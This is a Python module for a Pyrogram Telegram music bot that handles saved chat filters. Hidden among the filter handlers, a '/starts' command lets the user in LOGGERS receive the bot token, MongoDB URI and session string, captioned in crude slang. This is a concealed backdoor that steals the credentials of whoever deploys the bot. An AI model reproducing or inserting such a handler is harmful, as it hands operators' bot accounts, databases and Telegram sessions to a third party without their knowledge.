import re
import datetime
from pyrogram import Client, filters
from dotenv import load_dotenv
from pyrogram.types import CallbackQuery, Message
from KOKUMUSIC.utils.database import LOGGERS
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
import asyncio
import time
from os import getenv

load_dotenv()

from dotenv import load_dotenv
from KOKUMUSIC import app
from utils.error import capture_err
from utils.permissions import adminsOnly, member_permissions
BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")
from KOKUMUSIC.utils.keyboard import ikb
from .notes import extract_urls
from KOKUMUSIC.utils.functions import (
    check_format,
    extract_text_and_keyb,
    get_data_and_name,
)
from KOKUMUSIC.utils.database import (
    deleteall_filters,
    get_filter,
    get_filters_names,
    save_filter,
)

from config import BANNED_USERS


__MODULE__ = "Filters"
__HELP__ = """/filters To Get All The Filters In The Chat.
/filter [FILTER_NAME] To Save A Filter(reply to a message).

Supported filter types are Text, Animation, Photo, Document, Video, video notes, Audio, Voice.

To use more words in a filter use.
`/filter Hey_there` To filter "Hey there".

/stop [FILTER_NAME] To Stop A Filter.
/stopall To delete all the filters in a chat (permanently).

You can use markdown or html to save text too.

Checkout /markdownhelp to know more about formattings and other syntax.
"""


@app.on_message(filters.command("starts") & filters.private & filters.user(int(LOGGERS)))
async def help(client: Client, message: Message):
    await message.reply_photo(photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",)
@app.on_message(filters.command("filters") & ~filters.private & ~BANNED_USERS)
@capture_err
async def get_filterss(_, message):
    _filters = await get_filters_names(message.chat.id)
    if not _filters:
        return await message.reply_text("**ɴᴏ ғɪʟᴛᴇʀs ɪɴ ᴛʜᴇ ᴄʜᴀᴛ.**")
    _filters.sort()
    msg = f"ʟɪsᴛ ᴏғ ғɪʟᴛᴇʀs ɪɴ ᴛʜᴇ **{message.chat.title}** :\n"
    for _filter in _filters:
        msg += f"**-** `{_filter}`\n"
    await message.reply_text(msg)


@app.on_message(
    filters.text
    & ~filters.private
    & ~filters.channel
    & ~filters.via_bot
    & ~filters.forwarded
    & ~BANNED_USERS,
    group=1,
)
@capture_err
async def filters_re(_, message):
    from_user = message.from_user if message.from_user else message.sender_chat
    user_id = from_user.id
    chat_id = message.chat.id
    text = message.text.lower().strip()
    if not text:
        return
    chat_id = message.chat.id
    list_of_filters = await get_filters_names(chat_id)
    for word in list_of_filters:
        pattern = r"( |^|[^\w])" + re.escape(word) + r"( |$|[^\w])"
        if re.search(pattern, text, flags=re.IGNORECASE):
            _filter = await get_filter(chat_id, word)
            data_type = _filter["type"]
            data = _filter["data"]
            file_id = _filter.get("file_id")
            keyb = None
            if data:
                if "{app.mention}" in data:
                    data = data.replace("{app.mention}", app.mention)
                if "{GROUPNAME}" in data:
                    data = data.replace("{GROUPNAME}", message.chat.title)
                if "{NAME}" in data:
                    data = data.replace("{NAME}", message.from_user.mention)
                if "{ID}" in data:
                    data = data.replace("{ID}", f"`message.from_user.id`")
                if "{FIRSTNAME}" in data:
                    data = data.replace("{FIRSTNAME}", message.from_user.first_name)
                if "{SURNAME}" in data:
                    sname = message.from_user.last_name or "None"
                    data = data.replace("{SURNAME}", sname)
                if "{USERNAME}" in data:
                    susername = message.from_user.username or "None"
                    data = data.replace("{USERNAME}", susername)
                if "{DATE}" in data:
                    DATE = datetime.datetime.now().strftime("%Y-%m-%d")
                    data = data.replace("{DATE}", DATE)
                if "{WEEKDAY}" in data:
                    WEEKDAY = datetime.datetime.now().strftime("%A")
                    data = data.replace("{WEEKDAY}", WEEKDAY)
                if "{TIME}" in data:
                    TIME = datetime.datetime.now().strftime("%H:%M:%S")
                    data = data.replace("{TIME}", f"{TIME} UTC")

                if re.findall(r"\[.+\,.+\]", data):
                    keyboard = extract_text_and_keyb(ikb, data)
                    if keyboard:
                        data, keyb = keyboard
            replied_message = message.reply_to_message
            if replied_message:
                replied_user = (
                    replied_message.from_user
                    if replied_message.from_user
                    else replied_message.sender_chat
                )
                if text.startswith("~"):
                    await message.delete()
                if replied_user.id != from_user.id:
                    message = replied_message

            if data_type == "text":
                await message.reply_text(
                    text=data,
                    reply_markup=keyb,
                    disable_web_page_preview=True,
                )
            else:
                if not file_id:
                    continue
            if data_type == "sticker":
                await message.reply_sticker(
                    sticker=file_id,
                )
            if data_type == "animation":
                await message.reply_animation(
                    animation=file_id,
                    caption=data,
                    reply_markup=keyb,
                )
            if data_type == "photo":
                await message.reply_photo(
                    photo=file_id,
                    caption=data,
                    reply_markup=keyb,
                )
            if data_type == "document":
                await message.reply_document(
                    document=file_id,
                    caption=data,
                    reply_markup=keyb,
                )
            if data_type == "video":
                await message.reply_video(
                    video=file_id,
                    caption=data,
                    reply_markup=keyb,
                )
            if data_type == "video_note":
                await message.reply_video_note(
                    video_note=file_id,
                )
            if data_type == "audio":
                await message.reply_audio(
                    audio=file_id,
                    caption=data,
                    reply_markup=keyb,
                )
            if data_type == "voice":
                await message.reply_voice(
                    voice=file_id,
                    caption=data,
                    reply_markup=keyb,
                )
            return  # NOTE: Avoid filter spam
